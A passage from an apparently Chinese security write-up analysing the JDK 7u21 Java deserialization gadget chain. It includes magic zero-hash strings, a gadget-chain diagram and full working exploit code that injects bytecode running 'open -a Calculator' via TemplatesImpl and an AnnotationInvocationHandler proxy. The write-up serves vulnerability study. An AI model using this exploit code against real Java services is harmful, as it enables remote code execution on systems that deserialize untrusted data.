                i++;
            }
        }
    }
运行后会得到 hash 值为 0 的字符串，如下图所示:
    Found: 'f5a5a608'
    Found: '38aeaf9a6'
    Found: '4b463c929'
    Found: '6d49bc466'
    Found: '771ffcd3a'
    Found: '792e22588'
    Found: '84f7f1613'
    Found: '857ed38ce'
    Found: '9da576938'
    Found: 'a84356f1b'
## 0x04 jdk7u21 payload
整个gadget链：
    终点（要达到的目标）：Runtime.exec()
             ||
    TemplatesImpl.getOutputProperties()
                      TemplatesImpl.newTransformer()
                        TemplatesImpl.getTransletInstance()
                          TemplatesImpl.defineTransletClasses()
                            ClassLoader.defineClass()
                            Class.newInstance()
             ||
     AnnotationInvocationHandler.invoke()
              AnnotationInvocationHandler.equalsImpl()
                Method.invoke()
             ||
    Proxy(Templates).equals()
             ||
    Proxy(Templates).hashCode() (X)
            AnnotationInvocationHandler.invoke() (X)      
              AnnotationInvocationHandler.hashCodeImpl() (X)
                String.hashCode() (0)
                AnnotationInvocationHandler.memberValueHashCode() (X)
                  TemplatesImpl.hashCode() (X)
              ||
     LinkedHashSet.add()
              ||
    起点（要读取的内容）： LinkedHashSet.readObject()
    package src.main.java;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.*;
    import java.util.Arrays;
    import java.util.HashMap;
    import java.util.LinkedHashSet;
    import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
    class Reflections {
        public static Field getField(final Class clazz, final String fieldName) throws Exception {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
            return field;
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Constructor getFirstCtor(final String name) throws Exception {
            final Constructor ctor = Class.forName(name).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            return ctor;
        }
    }
    class ClassFiles {
        public static String classAsFile(final Class clazz) {
            return classAsFile(clazz, true);
        }
        public static String classAsFile(final Class clazz, boolean suffix) {
            String str;
            if (clazz.getEnclosingClass() == null) {
                str = clazz.getName().replace(".", "/");
            } else {
                str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
            }
            if (suffix) {
                str += ".class";
            }
            return str;
        }
        public static byte[] classAsBytes(final Class clazz) {
            try {
                final byte[] buffer = new byte[1024];
                final String file = classAsFile(clazz);
                final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
                if (in == null) {
                    throw new IOException("couldn't find '" + file + "'");
                }
                final ByteArrayOutputStream out = new ByteArrayOutputStream();
                int len;
                while ((len = in.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }
                return out.toByteArray();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    class Gadgets {
        static {
            // 启用SecurityManager时使用TemplatesImpl gadget的特殊情况
            System.setProperty(DESERIALIZE_TRANSLET, "true");
        }
        public static class StubTransletPayload extends AbstractTranslet implements Serializable {
         //   private static final long serialVersionUID = -5971610431559700674L;
            public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
            @Override
            public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
        }
        // required to make TemplatesImpl happy
        public static class Foo implements Serializable {
          //  private static final long serialVersionUID = 8207363842866235160L;
        }
        public static  T createProxy(final InvocationHandler ih, final Class iface, final Class ... ifaces) {
            final Class[] allIfaces
                    = (Class[]) Array.newInstance(Class.class, ifaces.length + 1);
            allIfaces[0] = iface;
            if (ifaces.length > 0) {
                System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
            }
            return iface.cast(
                    Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
        }
        public static TemplatesImpl createTemplatesImpl() throws Exception {
            final TemplatesImpl templates = new TemplatesImpl();
            // use template gadget class
            // 获取容器ClassPool，注入classpath
            ClassPool pool = ClassPool.getDefault();
           // System.out.println("insertClassPath: " + new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            // 获取已经编译好的类
           // System.out.println("ClassName: " + StubTransletPayload.class.getName());
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // 在静态的的构造方法中插入payload
            clazz.makeClassInitializer()
                    .insertAfter("java.lang.Runtime.getRuntime().exec(\""
                            +"open -a Calculator"
                            + "\");");
            // 给payload类设置一个名称
            // 允许重复执行的唯一名称（注意 PermGen 耗尽）
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            // 获取该类的字节码
            final byte[] classBytes = clazz.toBytecode();
            //System.out.println(Arrays.toString(classBytes));
            // 将类字节注入实例
            Reflections.setFieldValue(
                    templates,
                    "_bytecodes",
                    new byte[][] {
                            classBytes,
                            ClassFiles.classAsBytes(Foo.class)
                    });
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            // 只要触发这个方法就能执行我们注入的bytecodes
            // templates.getOutputProperties();
            return templates;
        }
    }
    public class exp {
        public Object buildPayload() throws Exception {
            // 生成 evil 模板，如果触发 templates.getOutputProperties()，可以执行命令
            Object templates = Gadgets.createTemplatesImpl();
            // magic string, zeroHashCodeStr.hashCode() == 0
            String zeroHashCodeStr = "f5a5a608";
            // build a hash map, and put our evil templates in it.
            HashMap map = new HashMap();
            //map.put(zeroHashCodeStr, "foo");  // Not necessary
            // Generate proxy's handler，use `AnnotationInvocationHandler` as proxy's handler
            // When proxy is done，all call proxy.anyMethod() will be dispatch to AnnotationInvocationHandler's invoke method.
            Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
    //        Reflections.setFieldValue(tempHandler, "type", Templates.class);  // not necessary, because newInstance() already pass Templates.class to tempHandler
            Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);
           // Reflections.setFieldValue(templates, "_auxClasses", null);
           // Reflections.setFieldValue(templates, "_class", null);
            LinkedHashSet set = new LinkedHashSet(); // maintain order
            set.add(templates);     // save evil templates
            set.add(proxy);         // proxy
            map.put(zeroHashCodeStr, templates);
            return set;
        }
        public static void main(String[] args) throws Exception {
            exp exploit = new exp();
            Object payload = exploit.buildPayload();
            // test payload
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
            oos.writeObject(payload);
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.bin"));
            ois.readObject();
        }
    }
结合payload看分析，明白payload为什么这样写，更容易帮助我们理解这个漏洞。
## 0x05 漏洞分析
如果分析过 CC 链或者看过 CC 链分析文章的朋友，一定知道在 CC 链中可以当成命令执行的载体有以下两个类：
  * `org.apache.commons.collections.functors.ChainedTransformer`
  * `org.apache.xalan.xsltc.trax.TemplatesImpl`
我们知道要想实现 RCE 就必须要调用一个命令执行类，`Runtime.getRuntime().exec()`，CC
链中的`org.apache.commons.collections.functors.ChainedTransformer`类就存在可以用于对象之间转换的`Transformer`接口，它有几个我们用得着的实现类，ConstantTransformer、InvokerTransformer以及ChainedTransformer，利用这几个对象，就可以构造出一个可以执行命令的链，从而达到命令执行的目的。
但若是没找到可以用于对象之间转换的接口或者这些接口在黑名单中怎么办呢？